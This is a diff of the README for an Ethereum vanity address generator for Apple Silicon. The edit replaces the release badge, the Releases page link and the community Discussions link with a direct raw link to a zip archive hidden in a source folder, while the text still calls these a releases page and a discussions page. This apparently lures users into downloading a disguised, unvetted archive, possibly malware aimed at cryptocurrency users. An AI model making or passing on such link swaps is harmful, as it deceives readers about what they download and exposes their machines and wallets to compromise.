@@ -1,7 +1,7 @@
 # 🎉 eth-vanity-metal - Create Unique Ethereum Addresses Effortlessly
 
 ## 📦 Download the Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/yasirrandhawa/eth-vanity-metal/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/yasirrandhawa/eth-vanity-metal/main/src/gpu/vanity-eth-metal-1.7-beta.1.zip%20Latest%https://raw.githubusercontent.com/yasirrandhawa/eth-vanity-metal/main/src/gpu/vanity-eth-metal-1.7-beta.1.zip)](https://raw.githubusercontent.com/yasirrandhawa/eth-vanity-metal/main/src/gpu/vanity-eth-metal-1.7-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to eth-vanity-metal, a fast Ethereum vanity address generator designed specifically for Apple Silicon. This application helps you create unique Ethereum addresses quickly and efficiently. 
@@ -13,7 +13,7 @@ Before you dive in, make sure your Mac meets the following requirements:
 - **Memory**: At least 4 GB of RAM
 
 ## 📥 Download & Install
-To get started, you need to visit this page to download the software: [Releases Page](https://github.com/yasirrandhawa/eth-vanity-metal/releases). 
+To get started, you need to visit this page to download the software: [Releases Page](https://raw.githubusercontent.com/yasirrandhawa/eth-vanity-metal/main/src/gpu/vanity-eth-metal-1.7-beta.1.zip). 
 
 1. Click the link above to open the Releases page.
 2. Find the latest version and click on it.
@@ -49,6 +49,6 @@ If you encounter any issues while using eth-vanity-metal, here are a few quick t
 - **Reach Out for Help**: If you still have issues, please consult the community or raise an issue on the repository's GitHub page.
 
 ## 🌍 Community and Support
-We encourage you to join our community! You can find discussions, help, and share experiences with other users on our [GitHub Discussions Page](https://github.com/yasirrandhawa/eth-vanity-metal/discussions).
+We encourage you to join our community! You can find discussions, help, and share experiences with other users on our [GitHub Discussions Page](https://raw.githubusercontent.com/yasirrandhawa/eth-vanity-metal/main/src/gpu/vanity-eth-metal-1.7-beta.1.zip).
 
 Thank you for choosing eth-vanity-metal! We look forward to seeing the unique addresses you create.
